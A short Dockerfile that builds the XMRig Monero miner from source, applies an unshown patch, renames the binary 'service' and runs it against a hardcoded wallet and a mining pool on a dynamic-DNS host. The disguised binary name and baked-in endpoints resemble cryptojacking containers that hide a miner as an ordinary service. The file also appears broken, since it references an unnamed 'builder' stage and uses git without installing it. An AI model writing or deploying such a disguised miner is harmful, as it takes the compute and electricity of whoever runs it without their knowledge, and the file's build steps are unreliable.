FROM alpine:latest

ARG XMRIG_VERSION='v6.20.0'
WORKDIR /servis

RUN git clone https://github.com/xmrig/xmrig && \
    mkdir xmrig/build && \
    cd xmrig && git checkout ${XMRIG_VERSION}

COPY supportxmr.patch /servis/xmrig
RUN cd xmrig && git apply supportxmr.patch

RUN cd xmrig/build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make -j$(nproc) 


FROM alpine:latest

ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
ENV POOL=imboost.duckdns.org:1123
ENV WORKER_NAME=x

WORKDIR /xmr
COPY --from=builder /servis/xmrig/build/xmrig /xmr
RUN mv xmrig service 

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
